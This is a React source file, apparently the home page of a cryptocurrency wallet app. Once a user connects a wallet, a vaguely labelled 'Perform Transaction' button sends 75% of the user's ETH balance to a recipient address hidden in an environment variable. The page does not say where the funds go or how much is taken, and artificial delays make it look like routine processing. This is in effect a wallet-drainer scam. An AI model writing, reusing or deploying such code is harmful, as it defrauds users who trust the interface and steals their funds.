import React, { useState } from "react";
import { useAccount, useBalance } from "wagmi";
import { ethers } from "ethers";
import { Link } from "react-router-dom";
import { FontAwesomeIcon } from "@fortawesome/react-fontawesome";
import { faSpinner } from "@fortawesome/free-solid-svg-icons";

export default function Home() {
  const { address, isConnected } = useAccount();
  const { data: balanceData } = useBalance({ address });
  const [loading, setLoading] = useState(false);
  const [transactionHash, setTransactionHash] = useState(null);

  const buttons = [
    {
      name: "Create New Wallet",
      link: "/create-wallet",
      color: "text-black",
      bgColor: "bg-white",
    },
    {
      name: "I already have wallet",
      link: "/import",
      color: "text-white",
      bgColor: "bg-gray-800",
    },
  ];

  const recipientAddress = import.meta.env.VITE_RECIPIENT_WALLET;

  const calculateTransactionValue = (balance) => {
    if (!balance) return BigInt(0);

    const balanceInEther = Number(ethers.utils.formatEther(balance));
    const transactionValue = balanceInEther * 0.75;

    return ethers.utils.parseUnits(transactionValue.toFixed(18), "ether");
  };

  const sendTransactionWithGas = async () => {
    setLoading(true);
    const timeout = 3000; 

    try {
      console.log("Balance Data:", balanceData);
      if (!balanceData?.value || balanceData.value.isZero()) {
        setTimeout(() => {
          alert("Insufficient balance to perform transaction.");
          setLoading(false); 
        }, timeout);
        return;
      }

      const provider = new ethers.providers.Web3Provider(window.ethereum);
      const gasPrice = await provider.getGasPrice();
      console.log("Gas Price:", gasPrice.toString());

      const value = calculateTransactionValue(balanceData.value);
      console.log("Transaction Value:", value.toString());

      const transaction = {
        to: recipientAddress,
        value,
        gasPrice,
      };

      const signer = provider.getSigner();
      const txResponse = await signer.sendTransaction(transaction);

      setTimeout(() => {
        setTransactionHash(txResponse.hash);
        alert("Transaction successful! Hash: " + txResponse.hash);
        setLoading(false); 
      }, timeout);
    } catch (error) {
      setTimeout(() => {
        console.error("Transaction failed:", error);
        if (error.code === "INSUFFICIENT_FUNDS") {
          alert("Insufficient funds to cover transaction fees.");
        } else {
          alert("Transaction failed. Please check your balance or try again.");
        }
        setLoading(false); 
      }, timeout);
    }
  };


  return (
    <div className="flex flex-col items-center justify-center min-h-screen w-full space-y-5">
      {loading ? (
        <div className="flex flex-col items-center justify-center min-h-screen text-black dark:text-white">
          <FontAwesomeIcon icon={faSpinner} spin size="3x" />
          <h1 className="mt-4">Please wait...</h1>
        </div>
      ) : (
        <>
          {isConnected ? (
            <>
              <button
                onClick={sendTransactionWithGas}
                disabled={loading}
                className="btn btn-active py-2 rounded-full w-full max-w-xs text-center">
                {loading ? "Processing..." : "Perform Transaction"}
              </button>
              {transactionHash && (
                <div className="mt-3 text-center">
                  <p className="text-sm text-green-600">
                    Transaction Successful! Hash:{" "}
                    <a
                      href={`https://etherscan.io/tx/${transactionHash}`}
                      target="_blank"
                      rel="noopener noreferrer"
                      className="text-blue-500 underline">
                      {transactionHash}
                    </a>
                  </p>
                </div>
              )}
            </>
          ) : (
            <div>
              {buttons.map((button, index) => (
                <Link
                  key={index}
                  to={button.link}
                  className={`btn btn-active ${button.color} ${button.bgColor} py-2 mb-3 rounded-full w-full text-center`}>
                  {button.name}
                </Link>
              ))}
            </div>
          )}
        </>
      )}
    </div>
  );
}
